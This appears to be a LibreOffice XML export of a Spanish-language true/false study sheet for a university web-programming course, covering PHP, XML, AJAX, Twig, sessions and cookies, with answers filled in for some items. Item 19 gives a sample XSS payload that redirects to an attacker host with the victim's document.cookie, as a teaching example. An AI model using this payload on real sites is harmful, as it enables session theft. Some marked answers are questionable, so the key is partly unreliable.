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4e8c"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00091f79"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0009600a"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0009a163"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0009d5ff"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000aad26"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000ca36c"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000e8fb0"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000f1257"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="001076d7"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0011eace"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0012b590"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="001490f0"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0014e8b1"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0015ef9a"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0017df4f"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00193cb7"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00195744"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="001bdbb2"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="001d916f"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00084e8c"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00091f79"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="0009600a"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#dc2300" fo:font-weight="bold" officeooo:rsid="0009600a" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#dc2300" fo:font-weight="bold" officeooo:rsid="0009a163" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#dc2300" fo:font-weight="bold" officeooo:rsid="0009d5ff" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#dc2300" fo:font-weight="bold" officeooo:rsid="000a77a2" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#dc2300" fo:font-weight="bold" officeooo:rsid="000a7b87" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#dc2300" fo:font-weight="bold" officeooo:rsid="0014e8b1" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#dc2300" fo:font-weight="bold" officeooo:rsid="0015ef9a" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#dc2300" fo:font-weight="bold" officeooo:rsid="00195744" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#dc2300" fo:font-weight="bold" officeooo:rsid="0019ec95" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#dc2300" fo:font-weight="bold" officeooo:rsid="001bdbb2" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties officeooo:rsid="0009a163"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#008000" fo:font-weight="bold" officeooo:rsid="0009a163" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties officeooo:rsid="0009d5ff"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="000aad26"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="000ca36c"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="000e8fb0"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="000f1257"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties officeooo:rsid="0011eace"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="0011eace" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="0012b590" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="001490f0" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="0014e8b1" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="0015ef9a" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="0017df4f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="00193cb7" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="00195744" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="001bdbb2" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="001d916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- OpenID es un protocolo que facilita la autenticacion y la autorizacion de acceso a recurso.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2- Para validar un documento XML se puede utilizar un DTD o un schema inidistintamente.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3- Los microformatos se utilizan para facilitar la visualizacion de los elementos de un documento HTML.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4- Las WCAG 2.0 proporcionan las pautas para el desarrollo de una aplicación web segura.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">5- Es posible correr una aplicación php sin untilizar un servidor web.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">6- El archivo php.ini contiene las opciones de configuracion de PHP y las mismas no pueden ser modificadas en ejecucion.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">7- La diferencia entre usar include() y require() en PHP es que el include() admite rutas relativas y el require() no.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">8- Firebug es una herramienta que puede ejecutarse tanto en el cliente como en el servidor.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">9- El uso de Twig no garantiza el uso de MVC</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">10- PEAR es un repositorio de codigo y extensiones para PHP escritos en C, por lo que deben compilarse antes de usarse.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">11- Tanto PEAR como PECL son repositorios que contienen paquetes PHP que pueden descargarse y utilizarse libremente.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2"><text:tab/></text:span><text:span text:style-name="T4">FALSO: PECL en C</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">12- El </text:span><text:span text:style-name="T3">modelo de eventos definido por DOM solo define la interfaz que representa a los tipos de eventos que se pueden producir.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:tab/></text:span><text:span text:style-name="T4">FALSO: tambien define la forma de procesar los eventos.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">13- No puedo usar AJAX si no cuento con un parser XML en el cliente.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3"><text:tab/> </text:span><text:span text:style-name="T4">FALSO: Se puede usar AJAX sin XML por ejemplo JSON.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">14- </text:span><text:span text:style-name="T14">Con la funcion ini.set() de PHP puedo modificar algunos parametros del archivo php.ini</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T15">VERDADERO:</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T14">15- <text:s/>PDO es un ORM.</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T4">FALSO: <text:s/></text:span><text:span text:style-name="T5">PDO es para abstraer la aplicación del motor de base de datos.</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T14">16- <text:s/></text:span><text:span text:style-name="T16">Las cookies se almacenan en el entorno del cliente y se envian al servidor cada vez que se hace una peticion al mismo.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T16"><text:tab/></text:span><text:span text:style-name="T15">VERDADERO:</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T16">17- Las operaciones de conectar y desconectar a la base de datos se incluyen en el controller.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T16"><text:tab/></text:span><text:span text:style-name="T4">FALSO: </text:span><text:span text:style-name="T6">Se incluyen en el modelo, que es el que interactua con la BD.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T16">18- La funcion session_start() genera siempre el ID de la sesion cada vez que se lo invoca.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T16"><text:tab/></text:span><text:span text:style-name="T4">FALSO: </text:span><text:span text:style-name="T6">Solo la genera si la sesion no esta iniciada con aterioridad, o en caso que el <text:tab/>desarrollador lo disponga asi, </text:span><text:span text:style-name="T7">para </text:span><text:span text:style-name="T8">evitar</text:span><text:span text:style-name="T7"> el robo de cookies.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T16">19- </text:span><text:span text:style-name="T17">El siguiente ejemplo corresponde a un caso tipico de un posible XSS hhtp://video_inseguro.com.ar/busqueda.php?clave=&lt;script&gt;window.location='</text:span><text:a xlink:type="simple" xlink:href="http://ataque.com.ar/xss.php?cookie='+document.cookie"><text:span text:style-name="T17">http://ataque.com.ar/xss.php?cookie='+document.cookie</text:span></text:a><text:span text:style-name="T17">&lt;/scirpt&gt;</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T17"><text:tab/></text:span><text:span text:style-name="T15">VERDADERO:</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T17">20- </text:span><text:span text:style-name="T18">JSON es una notacion que se utiliza en el cliente como alternativa a XML.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T4">FALSO:</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T18">21- </text:span><text:span text:style-name="T17"><text:s/></text:span><text:span text:style-name="T19">El uso de microformatos permite una mejor visualizacion de la pagina.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T19"/></text:p>
      <text:p text:style-name="P8"><text:soft-page-break/><text:span text:style-name="T19">22- Usando Javascript puedo implementar un contador de visitas en mi sitio.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T19"/></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20">23- Twig es una herramienta que facilita el control de XSS.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T4">FALSO:</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20">24- Las variables de sesion se mantienen en los clientes, no en el servidor.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20"/></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20">25- Las cookies son el mecanismo que se utiliza para almacenar las variables de sesion.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20"/></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20">26- Con Git se previene la aparicion de inyecciones SQL.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T4">FALSO:</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20">27- Apache, IIS y Firebug son servidores web.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T4">FALSO:</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20">28- </text:span><text:span text:style-name="T21">PHP no es un lenguaje de proposito general, solo puede ejecutarse en el </text:span><text:span text:style-name="T22">servidor.</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T22"><text:tab/></text:span><text:span text:style-name="T4">FALSO:</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T22">29- </text:span><text:span text:style-name="T23">PHP es un lenguaje compilado.</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T23"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T23">30- Para que una aplicación PHP funcione con una base de datos MySQL es necesario que ambos esten corriendo en el mismo equipo.</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T23"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T23">31- </text:span><text:span text:style-name="T24">Puedo ejecutar un codigo PHP sin tener ningun servidor web instalado?</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T24"><text:tab/></text:span><text:span text:style-name="T15">VERDADERO:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T24">32- Para utilizar JSON debo incluir, a travez del tag &lt;script&gt; en mi documento html la librería jQuery.</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T24"><text:tab/></text:span><text:span text:style-name="T4">FALSO:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T24">33- </text:span><text:span text:style-name="T25">La web 2.0 es lo que se conoce como web semantica.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T25"><text:tab/></text:span><text:span text:style-name="T4">FALSO: </text:span><text:span text:style-name="T9">La web semantica seria la 3.0.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T25">34- Un DTD me permite validar un documento XML.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T25"><text:tab/></text:span><text:span text:style-name="T15">VERDADERO:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T25">35- <text:s/></text:span><text:span text:style-name="T26">MDB2 es una librería nativa/incluida con el interprete PHP que me permite abstraerme de la base de datos.</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T26"><text:tab/></text:span><text:span text:style-name="T4">FALSO: </text:span><text:span text:style-name="T10">No es nativa.</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T26">36- </text:span><text:span text:style-name="T27">La diferencia entre include y require es que en la primera no se chequea errores antes de la inclusion.</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T27"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T27">37- PHPMyAdmin es una funcionalidad de MySQL que me permite realizar la gestion de la base desde la web.</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T27"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T27">38- La unica forma de evitar que los robots de busqueda indexen mi sitio es utilizando campos meta.</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T27"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T27">39- Puedo utilizar YAML tanto en el cliente como en el servidor.</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T27"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T27">40- Los templates definidos en Twig son siempre archivos de extension .tpl que se procesan en el servidor.</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T27"/></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T28">41- </text:span><text:span text:style-name="T29">SQL es el motor de base de datos usado por la catedra.</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T29"><text:tab/></text:span><text:span text:style-name="T4">FALSO: </text:span><text:span text:style-name="T11">SQL es un lenguaje de consulta no un motor </text:span><text:span text:style-name="T12">de base de datos </text:span><text:span text:style-name="T11">y en la catedra <text:tab/>utilizaron maria-DB</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T29">42- </text:span><text:span text:style-name="T30">Twig es un framework que me permite programar MVC</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T30"><text:tab/></text:span><text:span text:style-name="T4">FALSO: </text:span><text:span text:style-name="T13">twig es un motor de template, y solo favorece al desarrollo de una aplicaciones <text:tab/>MVC</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T30">43- </text:span><text:span text:style-name="T31">El objeto XMLHttpRequest permite realizar peticiones sincronicas o asincronicas.</text:span></text:p>
      <text:p text:style-name="P19"><text:soft-page-break/><text:span text:style-name="T31"/></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T31">44- Para implementar AJAX en mi aplicacione es necesario utilizar alguna librería Javascript como Jquery.</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T31"/></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T31">45- Los metodos desctructores de una clase en PHP no llevan argumentos y se invocan implicitamente al eliminarse una instancia de la mis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4-11-05T14:28:07</meta:creation-date>
    <meta:generator>LibreOffice/4.0.2.2$Linux_X86_64 LibreOffice_project/400m0$Build-2</meta:generator>
    <dc:date>2014-11-05T17:55:51</dc:date>
    <dc:creator>Francisco </dc:creator>
    <meta:editing-duration>PT3H16M30S</meta:editing-duration>
    <meta:editing-cycles>22</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="66" meta:word-count="814" meta:character-count="4737" meta:non-whitespace-character-count="3959"/>
  </office:meta>
</office:document-meta>
</file>